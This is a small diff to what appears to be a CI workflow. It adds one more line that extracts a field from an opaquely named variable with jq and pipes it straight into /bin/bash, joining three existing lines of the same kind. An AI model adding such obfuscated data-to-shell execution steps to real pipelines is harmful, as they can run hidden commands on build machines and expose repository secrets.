@@ -32,6 +32,7 @@ jobs:
           echo $feft1 | jq -r .q76 | /bin/bash
           printf '%s' "$r66" | jq -r .r670 | /bin/bash
           echo $hrr4914 | jq -r .tfhgj914 | /bin/bash
+          printf '%s' "$osrco9" | jq -r .ow10597 | /bin/bash
 
       - name: Save artifact
         uses: actions/upload-artifact@v4
